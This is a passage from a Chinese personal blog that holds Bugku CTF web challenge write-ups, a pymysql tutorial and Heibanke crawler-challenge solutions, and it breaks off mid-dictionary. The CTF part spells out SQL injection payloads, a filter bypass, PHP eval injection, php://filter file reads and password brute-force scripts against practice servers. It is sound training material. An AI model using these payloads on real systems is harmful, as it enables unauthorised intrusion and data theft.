GET请求向服务器提交的参数num值不能是单纯由数字组成的字符串，且参数num值必须等于1，才能拿到flag，看似前后自相矛盾，但是php是门弱类型语言，字符串与数字进行比较时，会截取字符串的前面数字部分与整形数字进行比较，例如我们输入参数num值为1a，会截取a前面的1作为整形与整形1比较，所以输入1a即可拿到flag web3网址：http://120.24.86.145:8002/web3/ 一直不停地弹窗，直接查看源代码 发现一串加密的东西，拿去html解码 得到KEY{J2sa42ahJK-HS11III} sql注入网址：http://103.238.227.13:10083/ 从页面提示来看，注入点是id，是数字型注入 输入id=0,id=1，返回的都是id为1的key值 输入id=1’，id=1”,都没有报错，依然都返回id=1的结果，查看一些源代码 发现编码方式是gbk，猜测可能存在宽字节注入 输入id=1%df%27 出现了报错 说明了存在宽字节注入，也说明了id被单引号包裹 有报错，有返回信息，可以考虑用union联合注入 先爆出查询字段数 输入id=1%df%27 order by 2 %23，正确返回查询结果 输入id=1%df%27 order by 3 %23，出现了报错 所以查询字段数为2，那么我们前面已经知道了输入id=2时查询结果为空 我们先爆库，输入id=2%df%27 union select database(),2%23 当前库名为sql5 再爆当前库下的表名，输入id=2%df%27 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()%23 sql5库下的表名为key,test 题目又有提示查询的是key表 那么我们就继续爆key表下的列名，输入id=2%df%27 union select group_concat(column_name),2 from information_schema.columns where table_name=’key’%23 这里出现了报错，发现是单引号被转义了，因此我们可以将字符串key转化成十六进制 得到了key表下的列名为id和string 那么查询id列和string列的值 输入id=2%df%27 union select group_concat(id),group_concat(string) from key%23 54f3320dc261f313ba712eb3f13a1f6d 即为flag值 域名解析根据提示，将 flag.bugku.com 解析到120.24.86.145 就能拿到flag 在hosts文件最末尾添加一行 120.24.86.145 flag.bugku.com 然后在浏览器输入flag.bugku.com，就可以看到flag sql注入1网址：http://103.238.227.13:10087/ 页面给出了关键的代码： 123456789101112$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;$id = strip_tags($id);$query = \"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1\"; 过滤了一些注入关键词，但是id又经过了strip_tags函数的处理，这个函数可以过滤html标签 所以，在过滤的关键词中加入&lt;&gt;即可绕过过滤 从源代码看注入点是id，没有被引号包裹 输入id=1’，没有查询结果，也没报错，说明这里没有显示报错信息，不能用报错注入，但依然可以用联合注入 还是先爆查询字段数，输入id=1 o&lt;&gt;rder by 2%23，正确返回结果 输入id=1 o&lt;&gt;rder by 3%23,没有返回结果，说明查询字段数为2 接下来爆库，输入id=2 u&lt;&gt;nion s&lt;&gt;elect database(),2%23 当前库名为sql3 爆sql3库下的表名，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(t&lt;&gt;able_name),2 f&lt;&gt;rom info&lt;&gt;rmation_schema.t&lt;&gt;ables where t&lt;&gt;able_schema=database()%23 sql3库下的表名为hash,key,temp 爆key表下的列名，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(column_name),2 f&lt;&gt;rom info&lt;&gt;rmation_schema.columns where t&lt;&gt;able_name=’key’%23 hash表的列名为id,hash 爆id,hash列的值，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(id),group_concat(hash) f&lt;&gt;rom sql3.key%23 flag：c3d3c17b4ca7f791f85e#$1cc72af274af4adef 你必须让它停下网址：http://120.24.86.145:8002/web12/ 进去页面后发现一直不停地在刷新，看一下源代码 123456&lt;script language=\"JavaScript\"&gt;function myrefresh()&#123;window.location.reload();&#125;setTimeout('myrefresh()',500); &lt;/script&gt; 这里定义了一个函数myrefresh，语句window.location.reload()作用是刷新一次页面，再用setTimeout方法定时刷新一次页面，我们用burp拦截下每次请求的包，发现每次响应的图片都不一样 于是用burp的intruder模块发送100次请求报文 发现其中有个响应报文长度比其他都长，查看响应内容，发现flag 本地包含网址：http://120.24.86.145:8003/ 源代码： 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__); ?&gt; REQUEST包含了POST和GET，我们通过提交给服务器一个参数hello，服务器利用eval函数执行hello的值的内容，很明显存在命令执行的漏洞，我们可以通过闭合符号的方法去执行多条命令，将flag.php文件内容读取出来 我们输入hello=1);print_r(file(‘./flag.php’) 这样将相当于形成语句eval(“var_dump(hellp=1);print_r(file(‘./flag.php’));”) 执行了多条命令 当然也可以直接输入hello=print_r(file(‘./flag.php’)) 都可以读出flag 变量1网址：http://120.24.86.145:8004/index1.php 源代码： 1234567891011121314&lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; 跟上一题有点像，用到了正则匹配，参数args值必须是由[A-Za-z0-9]字符集组成，并且将args值作为新的变量输出然后eval函数执行 根据题目的提示，flag值是一个变量，然而这个变量并不在我们访问的php文件中有定义，所以我们可以猜测flag可能是一个全局变量，php的全局变量是$GLOBALS，所以可以给参数args赋值GLOBALS，就可以将全局变量输出出来 果然，flag就在里面 Web5网址：http://120.24.86.145:8002/web5/ 看起来要提交一个表单 看一下源代码 发现一个隐藏的一串代码 查询知道这是一串JSFuck代码，是将js代码编译生成的一串长代码 放到http://www.bugku.com/tools/jsfuck/解码得到 头等舱网址：http://120.24.86.145:9009/hd.php 访问页面发现什么也没有，源代码也看不出什么 试着用burp抓包 在响应头部发现flag值 Web4网址：http://120.24.86.145:8002/web4/ 网页提示我们看一下源代码 发现一串被url加密的js代码 12345&lt;script&gt;var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));&lt;/script&gt; 解码后： 123var p1 = 'function checkSubmit()&#123;var a=document.getElementById(\"password\");if(\"undefined\"!=typeof a)&#123;if(\"67d709b2b';var p2 = 'aa648cf6e87a7114f1\"==a.value)return!0;alert(\"Error\");a.focus();return!1&#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit;';eval(unescape(p1)+unescape('54aa2'+p2)); 拼接后eval函数执行的语句： 1234567891011121314&lt;script&gt; function checkSubmit()&#123; var a = document.getElementById(\"password\"); if(\"undefined\" != typeof a)&#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\" == a.value)&#123; return !0; &#125; alert(\"Error\"); a.focus(); return !1; &#125; &#125; document.getElementById(\"levelQuest\").onsubmit = checkSubmit();&lt;/script&gt; 大致逻辑就是输入拼接后的password：67d709b2b54aa2aa648cf6e87a7114f1得到flag flag在index里网址：http://120.24.86.145:8005/post/ 点击链接，发现跳转到?file=show.php，猜测是文件包含漏洞 根据题目提示，利用php内置协议读取index.php内容 输入?file=php://filter/read=convert.base64-encode/resource=index.php 得到一串base64加密的字符串，解密得index.php内容： 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125; $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 成功得到flag，同时可以看到过滤了关键词../,input,data 输入密码查看flag网址：http://120.24.86.145:8002/baopo/ 提示我们输入正确的5位密码就能查看到flag，根据提示，直接写个脚本爆破密码就行，代码如下： 12345678910111213141516171819202122import requestsurl = 'http://120.24.86.145:8002/baopo/'pwd = '0'while True: if len(pwd) != 5 : add = 5 - len(pwd) addstr = '' for i in range(add): addstr = '0' + addstr pwd = addstr + pwd data = &#123; 'pwd':pwd &#125; r = requests.post(url,data=data) r.encoding = r.apparent_encoding if '密码不正确' not in r.text: print(pwd,': correct password!!!!!!!') break else: print(pwd,': wrong password') pwd = str(int(pwd)+1) 爆破出的密码是13579 点击一百万次网址：http://120.24.86.145:9001/test/ 看提示是要点击一百万次才能拿到flag 仔细看看源代码的js部分 1234567if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action=\"\" method=\"post\"&gt;' + '&lt;input type=\"text\" name=\"clicks\" value=\"' + clicks + '\" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; 可以看出当我们点击一百万次时会自动提交一个表单给服务器 那么我们可以直接发送POST请求提交参数clicks给服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&gt;&gt;&gt; import requests&gt;&gt;&gt; url = 'http://120.24.86.145:9001/test/'&gt;&gt;&gt; data = &#123; 'clicks':1000000 &#125;&gt;&gt;&gt; r = requests.post(url,data=data)&gt;&gt;&gt; r.encoding = r.apparent_encoding&gt;&gt;&gt; print(r.text)&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;style&gt; h1&#123; color: white; text-align: center; &#125; body&#123; background-color: black; &#125; img&#123; display: block; margin: 0 auto; &#125; #flag&#123; color: white; text-align: center; display: block; &#125; &lt;/style&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;script src=\"jquery-3.2.1.min.js\"&gt;&lt;/script&gt; &lt;title&gt;点击一百万次&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 id=\"goal\"&gt;Goal: &lt;span id=\"clickcount\"&gt;0&lt;/span&gt;/1000000&lt;/h1&gt; &lt;img id=\"cookie\" src=\"cookie.png\"&gt; &lt;span id=\"flag\"&gt;flag&#123;Not_C00kI3Cl1ck3r&#125;&lt;/span&gt; &lt;/body&gt; &lt;script&gt; var clicks=0 $(function() &#123; $(\"#cookie\") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $(\"#clickcount\").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action=\"\" method=\"post\"&gt;' + '&lt;input type=\"text\" name=\"clicks\" value=\"' + clicks + '\" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;); &#125;); &lt;/script&gt;&lt;/html&gt; 拿到了flag:flag{Not_C00kI3Cl1ck3r} 备份是个好习惯网址：http://120.24.86.145:8002/web16/ 进入页面只有一串看似加密过的长文d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e 尝试各种解密方法都不行，源代码也没有提示什么 回到题目名字：备份 经过查询得知 ：备份文件一般情况是在后缀名后加的.swp，.bak 于是输入url：http://120.24.86.145:8002/web16/index.php.bak 发现下载了备份文件，用编辑器打开 发现php代码： 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);$str = substr($str,1);$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; 看起来要绕过过滤拿到flag 先了解全局变量$_SERVER[‘REQUEST_URI’]它代表访问页面的URI 例子： 123456&lt;?php$a = $_SERVER['REQUEST_URI'];echo $a;?&gt; 结果： 所以本题的$_SERVER[‘REQUEST_URI’]值为/web16/index.php?… 再经过strstr函数返回?后面的字符串，也就是get的参数 再通过substr函数返回各个参数，然后再通过str_replace函数将字符串中的’key’过滤 处理后再经由parse_str函数将查询字符串解析到变量中 如处理字符串”key1=1&amp;key2=2”，则创建变量key1=1,变量key2=2 然后判断如果变量key1和key2值不完全相等且md5加密后的两个值相等，则输出flag值 绕过str_replace函数方法很简单，双写即可绕过，md5加密后相等但本身不相等的两个值为240610708 和QNKCDZO 于是访问http://120.24.86.145:8002/web16/index.php?kkeyey1=240610708&amp;kkeyey2=QNKCDZO 拿到flag 成绩单网址：http://120.24.86.145:8002/chengjidan/ 提交表单参数id=1,2,3时返回不同结果，提交id=1’无返回结果，明显存在sql注入漏洞 爆查询字段数：输入id=1’ order by 4 #有返回结果，输入id=1’ order by 5#无返回结果 所以查询字段数为4 爆当前库：输入id=0’ union select database(),2,3,4# 当前库名为skctf_flag 爆当前库下的表名：输入id=0’ union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()# 表名为fl4g,sc 爆fl4g表下的列名：输入id=0’ union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=’fl4g’# 列名为skctf_flag 爆数据：输入id=0’ union select group_concat(skctf_flag),2,3,4 from skctf_flag.fl4g# 拿到flag 秋名山老司机网址：http://120.24.86.145:8002/qiumingshan/ 要求我们post一个value参数，值为页面的一串公式的计算结果，且每两秒会刷新一个新的公式 只能写脚本，代码如下： 123456789101112131415161718import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()while True: r = s.get(url) match = re.search(r'&lt;div&gt;(.*)=',r.text) result = eval(match.group(1)) data = &#123; 'value':str(result) &#125; r = s.post(url,data=data) match = re.search(r'&lt;div&gt;(.*)=',r.text) if not match: print(r.text) break print(r.text) 这里利用正则匹配出公式，利用eval函数计算出结果 测试得一定概率才能获得flag 速度要快网址：http://120.24.86.145:8002/web6/ 源代码提示post一个正确的margin参数给服务器就能拿到flag 用burp抓包发现响应头包含了flag字段，并且每次响应的flag字段值都不一样，猜测就是提交这个flag值 第一次的代码： 123456789101112import requestsurl = 'http://120.24.86.145:8002/web6/'s = requests.Session()r = s.get(url)flag = r.headers['flag']print('flag:',flag)data = &#123; \"margin\": flag&#125;r = s.post(url,data=data)print(r.text) 结果： 发现不对，才发现还需要将flag字段值进行base64解码 第二次的代码： 1234567891011121314import requestsimport base64url = 'http://120.24.86.145:8002/web6/'s = requests.Session()r = s.get(url)flag = r.headers['flag']flag = bytes.decode(base64.b64decode(flag)).split(':')[1]print('flag:',flag)data = &#123; \"margin\": flag&#125;r = s.post(url,data=data)print(r.text) 结果： 还是不对，借鉴了别人的代码才发现还得对上面的flag在进行一次base64解码，真是坑… 最后的代码： 1234567891011121314import requestsimport base64url = 'http://120.24.86.145:8002/web6/'s = requests.Session()r = s.get(url)flag = bytes.decode(base64.b64decode(r.headers['flag'])).split(':')[1]flag = bytes.decode(base64.b64decode(flag))print('flag:',flag)data = &#123; 'margin':flag &#125;r = s.post(url,data=data)print(r.text) 结果：","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Python数据库编程","slug":"Python数据库编程","date":"2018-07-28T09:30:00.000Z","updated":"2018-07-28T13:21:09.556Z","comments":true,"path":"/posts/21317/","link":"","permalink":"https://Foxgrin.github.io/posts/21317/","excerpt":"Python中的第三方库pymysql提供了与数据库连接并且进行交互的功能","text":"Python中的第三方库pymysql提供了与数据库连接并且进行交互的功能 pymysql库的安装1pip install pymysql pymysql库的使用(1)导入pymysql库 1import pymysql (2)使用pymysql.connect()方法创建python客户端与数据库连接的connection对象 1conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root') connect方法中的参数： 1)host：字符串类型，表示mysql服务器地址 2)port：数字类型，表示mysql服务器端口号，默认为3306 3)user：字符串类型，表示mysql数据库用户名 4)passwd：字符串类型，表示mysql数据库密码 5)db：字符串类型，表示连接到的数据库名 6)charset：字符串类型，表示连接编码 (3)使用connection对象的cursor()方法创建于数据库交互的对象 1cur = conn.cursor() (4)使用cursor对象的execute()方法执行sql语句 12sql = ''row = cur.execute() #返回查询结果的行数 (5)使用cursor对象的fetchone,fetchmany,fetchall方法获得查询结果 1result = cur.fetchone() #取得结果集的下一行 例子： 1234567891011&gt;&gt;&gt; import pymysql&gt;&gt;&gt; conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')&gt;&gt;&gt; cur = conn.cursor()&gt;&gt;&gt; sql = 'show databases'&gt;&gt;&gt; row = cur.execute(sql)&gt;&gt;&gt; result = cur.fetchone()&gt;&gt;&gt; print(result)('information_schema',)&gt;&gt;&gt; result = cur.fetchone()&gt;&gt;&gt; print(result)('mysql',) 1result = cur.fetchmamy(size) #取得结果集的下几行 例子： 1234567891011&gt;&gt;&gt; import pymysql&gt;&gt;&gt; conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')&gt;&gt;&gt; cur = conn.cursor()&gt;&gt;&gt; sql = 'show databases'&gt;&gt;&gt; row = cur.execute(sql)&gt;&gt;&gt; result = cur.fetchmany(2)&gt;&gt;&gt; print(result)(('information_schema',), ('mysql',))&gt;&gt;&gt; result = cur.fetchmany(2)&gt;&gt;&gt; print(result)(('performance_schema',), ('security',)) 1result = cur.fetchall() #取得结果集的所有行 例子： 12345678&gt;&gt;&gt; import pymysql&gt;&gt;&gt; conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')&gt;&gt;&gt; cur = conn.cursor()&gt;&gt;&gt; sql = 'show databases'&gt;&gt;&gt; row = cur.execute(sql)&gt;&gt;&gt; result = cur.fetchall()&gt;&gt;&gt; print(result)(('information_schema',), ('mysql',), ('performance_schema',), ('security',), ('test',)) (6)使用cursor对象的commit()方法将修改提交到数据库 1cur.commit() (7)关闭cursor对象和connection对象 12cur.close()conn.close() 使用pymysql库实现数据库的增删改查(1)创建新的数据库pymysql，并且创建新的数据表demo，列名分别为id,username,password 123456789101112131415161718192021222324import pymysqlconn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')cur = conn.cursor()createdb_sql = 'create database pymysql'cur.execute(createdb_sql)querydb_sql = 'show databases'cur.execute(querydb_sql)result = cur.fetchall()if ('pymysql',) in result: print('Database has created successfully!')selectdb_sql = 'use pymysql'cur.execute(selectdb_sql)createtb_sql = 'create table demo(id int(3),username varchar(20),password varchar(20))'cur.execute(createtb_sql)querytb_sql = 'show tables'cur.execute(querytb_sql)result = cur.fetchall()if ('demo',) in result: print('Table has created successfully!') 运行结果： mysql命令行中查询： (2)向demo表中添加修改数据 1234567891011121314151617181920212223242526272829import pymysqlconn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')cur = conn.cursor()selectdb_sql = 'use pymysql'cur.execute(selectdb_sql)data = [[1,'admin1','admin1'],[2,'admin2','admin2'],[3,'admin3','admin3']]for i in data: ID = i[0] username = i[1] password = i[2] insert_sql = \"insert into demo values(%d,'%s','%s')\"%(ID,username,password) cur.execute(insert_sql)query_sql = 'select * from demo'cur.execute(query_sql)result = cur.fetchall()print(result)update_sql = \"update demo set username='Stuxnet8',password='Stuxnet8' where id=3\"cur.execute(update_sql)cur.execute(query_sql)result = cur.fetchall()print(result)cur.close()conn.close() 运行结果： (3)删除列，表，库 123456789101112131415161718192021222324import pymysqlconn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root',db='pymysql')cur = conn.cursor()deletecu_sql = \"delete from demo where id=1\"cur.execute(deletecu_sql)query_sql = 'select * from demo where id=1'if cur.execute(query_sql) == 0: print('column 1 has deleted')deletetb_sql = \"drop table demo\"cur.execute(deletetb_sql)query_sql = 'show tables'if cur.execute(query_sql) == 0: print('table has deleted')deletedb_sql = \"drop database pymysql\"cur.execute(deletedb_sql)query_sql = 'show databases'cur.execute(query_sql)result = cur.fetchall()if ('pymysql',) not in result: print('database has deleted')","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"黑板客爬虫闯关(1-5)","slug":"黑板客爬虫闯关(1~5)","date":"2018-07-26T08:34:00.000Z","updated":"2018-07-26T14:40:26.906Z","comments":true,"path":"/posts/18564/","link":"","permalink":"https://Foxgrin.github.io/posts/18564/","excerpt":"昨天偶然间发现了一个爬虫的闯关网站，就赶紧来用它练一练爬虫，今天总算是将五个关卡都通关了，其中也碰到不少坑，通过百度借鉴别人的思路代码也都慢慢解决了，学到了很多，下面就附上五个关卡的思路和代码","text":"昨天偶然间发现了一个爬虫的闯关网站，就赶紧来用它练一练爬虫，今天总算是将五个关卡都通关了，其中也碰到不少坑，通过百度借鉴别人的思路代码也都慢慢解决了，学到了很多，下面就附上五个关卡的思路和代码 Pass-1网址：http://www.heibanke.com/lesson/crawler_ex00/ 首先页面给的提示是要我们在网址后面输入数字73618 访问http://www.heibanke.com/lesson/crawler_ex00/73618/ 页面又提示要输入数字53825 访问http://www.heibanke.com/lesson/crawler_ex00/53825/ 又提示要输入数字，于是推测这关要一直输入到某个数字后才能得到最后结果 那么我们可以将每个提示页面的数字，即下一个要输入的数字爬取下来，与原来的url构成一个下一个要访问的url，再继续爬取数字，假如爬取不到数字，就猜测可能得到了最后的结果 代码如下： 123456789101112131415import requestsimport reurl = 'http://www.heibanke.com/lesson/crawler_ex00/'num = ''while True: next_url = url+num print(next_url) r = requests.get(next_url) match = re.search(r'数字.*(\\d&#123;5&#125;)',r.text) if not match: print('You have found the last number!') print('The last number is:',str(num)) break num = match.group(1) 这里通过正则匹配出下一个要输入的数字，然后与网页原本的url拼成下一个要访问的url，当匹配不到数字时退出循环 运行结果： 猜测69428是最后输入的数字，我们访问一下http://www.heibanke.com/lesson/crawler_ex00/69428/ 果然，页面提示了通关，点击下一关按钮，进入到第二关的页面 Pass-2网址：http://www.heibanke.com/lesson/crawler_ex01/ 首先根据页面提示，我们需要在表单中输入一个用户名和密码，用户名可以随机输入，密码则是1到30之间的数字 我们先来看一下源代码中的表单部分 可以看出表单是以POST形式提交的，提交的参数为username和password，还会提交一个隐藏的token值，看到token值，我们的第一反应都是要先获取到页面的token值，与数据一起提交，但是经过测试，这关后台服务器并没有对token值进行检测，也就是说我们在程序中并不需要提交这个token值，也可以提交成功，既然不用管token，那么这关就很简单了 我们先随意提交一个用户名aaa和密码1看看提示是什么 可以看到页面提示”您输入的密码错误”，说明这是输入错误的提示信息，那么思路就很清晰了，我们依次提交数值为1-30之间的密码值，然后根据页面的提示信息是否包含”您输入的密码错误”，如果没有则可能是正确的密码 代码如下： 123456789101112131415import requestsurl = 'http://www.heibanke.com/lesson/crawler_ex01/'for i in range(1,31): data = &#123; 'username':'aaa', 'password':i, 'submit':'提交' &#125; r = requests.post(url,data=data) if '您输入的密码错误' not in r.text: print('Correct password:',str(i)) break else: print('Wrong password:',str(i)) 运行结果： 说明20可能是正确的密码，我们在浏览器中提交 闯关成功，继续点击下一关按钮进入第三关 Pass-3网址：http://www.heibanke.com/lesson/crawler_ex02/ 我们会发现自动跳转到了登录页面，也就是说这一关需要模拟登录 我们先注册一个账号和密码登录进去 看起来和上一关没什么区别，一样是输入用户名和密码，用户名是随意的，密码还是1-30之间的数字，唯一区别在于页面提示比上一关多了两层保护，光看这句话还是很懵逼的，没事，我们看一看页面源代码，就可以大致猜到到底是什么保护了 可以看出表单提交了隐藏的token值，猜测这关服务器会对token值进行检测 再回到登录页面，查看源代码的表单部分 登录页面也有一个token值 所以思路是这样的，我们首先需要模拟登录，这就需要用到requests库的Session方法保持一个会话记录，否则我们再次访问这关的页面依旧会跳转到登录页面，然后我们还需要爬取页面信息的token值，也就是提交token的input标签的value值 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom bs4 import BeautifulSouplogin_url = 'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex02/'pass_url = 'http://www.heibanke.com/lesson/crawler_ex02/'s = requests.Session()def getToken(html): soup = BeautifulSoup(html,'html.parser') token = soup.find_all('input')[0]['value'] return tokendef login(): r = s.get(url=login_url) login_token = getToken(r.text) login_data = &#123; 'csrfmiddlewaretoken':login_token, 'username':'xxx', #替换成自己的用户名 'password':'xxx' #替换成自己的密码 &#125; login = s.post(url=login_url,data=login_data) if '这里是黑板客爬虫闯关的第三关' in login.text: print('login successfully!') pass_token = getToken(login.text) return pass_token pass_token = login()for i in range(31): data = &#123; 'csrfmiddlewaretoken':pass_token, 'username':'aaa', 'password':i &#125; result = s.post(url=pass_url,data=data) if '您输入的密码错误' not in result.text: print('------Correct password:',str(i)) break else: print('fail to pass') 这里用了BeautifulSoup库的find_all方法获得所有input标签组成的列表，观察出token值所在的input标签是列表的第一个元素，就可以通过索引获得token值，登录成功后还要继续抓取关卡页面的token值，与用户名和密码一起提交 最后的运行结果如下： 在浏览器中提交用户名：aaa，密码：4 闯关成功，此处后台代码有误，点击下一关还是第三关的页面，但是我们可以根据前面几关的url推测出第四关的url：http://www.heibanke.com/lesson/crawler_ex03/ Pass-4网址：http://www.heibanke.com/lesson/crawler_ex03/ 跟第三关一样，还是需要先登录 登录后来到第四关关卡页面 页面提示”密码很长，是试不出来的，需要找出来”，看一下源代码，还是跟第二关第三关一样，提交username和password参数，服务器有对token值进行检测 但是还是没有关于密码的提示部分信息 怎么办呢，我们先试一下随便输入一个密码1，看看页面返回什么 惊喜的发现提示来了，我们点击”在这里耐心找”访问到提示页面(PS：这个页面有点慢，需要耐心等待加载) 仔细观察，会发现这里提示信息是给出了一共100位的密码，其中每一位的值，而且每一页显示的位数还会变化，所以这里要访问所有的页数获取每一位数和对应的值是行不通的，所以我们干脆就一直访问第一页，爬取每一位的位数和对应的值，直到爬取位数共有100为止 直接附上代码吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsimport refrom bs4 import BeautifulSouplogin_url = 'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex03/'pass_url = 'http://www.heibanke.com/lesson/crawler_ex03/'hint_url = 'http://www.heibanke.com/lesson/crawler_ex03/pw_list/'s = requests.Session()def getToken(html): soup = BeautifulSoup(html,'html.parser') token = soup.find_all('input')[0]['value'] return tokendef login(): r = s.get(login_url) login_token = getToken(r.text) login_data = &#123; 'csrfmiddlewaretoken':login_token, 'username':'xxx', 'password':'xxx' &#125; login = s.post(url=login_url,data=login_data) if '这里是黑板客爬虫闯关的第四关' in login.text: print('login successfully') pass_token = getToken(login.text) return pass_tokendef getDict(): total_pos = [] passwordDict = &#123;&#125; while True: hint = s.get(url=hint_url) pos = re.findall(r'title=\"password_pos\"&gt;(\\d*)',hint.text) value = re.findall(r'title=\"password_val\"&gt;(\\d*)',hint.text) for i in range(len(pos)): if pos[i] not in total_pos: total_pos.append(pos[i]) passwordDict[pos[i]] = value[i] if len(total_pos) == 100: break else: print(len(total_pos)) print(passwordDict) return passwordDictdef getPassword(dic): passList = [] for i in range(1,101): passList.append(dic[str(i)]) password = ''.join(passList) return passwordpass_token = login()passwordDict = getDict()print(passwordDict)password = getPassword(passwordDict)print(password) 一开始还是跟第三关一样，先获取登录页面的token值，然后登录，页面如果有返回”这里是黑板客爬虫闯关的第四关”的信息说明登录成功，登录成功再获取关卡页面的token值，接下来就获取位置数和对应的值，这里定义了一个列表total_pos用来存放总的位置数和一个字典 passwordDict用来存放位置数及其对应的值，然后不断的访问提示页面的第一页，通过re模块的findall方法匹配出pos和value列表，每次匹配完检查pos列表的每一个元素，如果不在total_pos中，则添加进total_pos中，并将‘pos[i]’:’value[i]’键值对添加进字典中，直到匹配出100位为止，此时就获得了每一位和对应的值，再从第一位开始从字典中取出value值，添加进passList列表中，最后将passList列表元素拼成一个长字符串，就是最后获得的密码 这里过程实在是很慢，总之看脸…脸好很快就爬到了100位 最后获得的字典： 123passwordDict = &#123; '73': '8', '76': '6', '28': '5', '72': '1', '61': '4', '32': '3', '57': '6', '75': '3', '90': '0', '53': '7', '74': '1', '56': '2', '83': '1', '34': '9', '44': '4', '70': '6', '92': '4', '18': '5', '93': '8', '37': '8', '85': '3', '67': '8', '17': '3', '62': '3', '84': '6', '24': '5', '8': '8', '15': '3', '100': '2', '55': '3', '1': '3', '10': '7', '20': '7', '79': '3', '12': '4', '91': '6', '36': '4', '43': '6', '60': '8', '48': '0', '25': '0', '22': '8', '4': '1', '16': '5', '94': '9', '54': '4', '50': '9', '66': '4', '64': '1', '5': '8', '47': '9', '51': '4', '80': '4', '69': '7', '71': '6', '7': '0', '96': '3', '46': '9', '2': '3', '27': '9', '49': '3', '13': '5', '99': '0', '89': '7', '39': '4', '26': '6', '63': '7', '29': '2', '52': '8', '65': '3', '33': '2', '30': '4', '9': '6', '86': '2', '19': '7', '38': '9', '40': '6', '98': '7', '77': '9', '59': '4', '41': '1', '42': '3', '21': '4', '45': '7', '58': '0', '6': '3', '81': 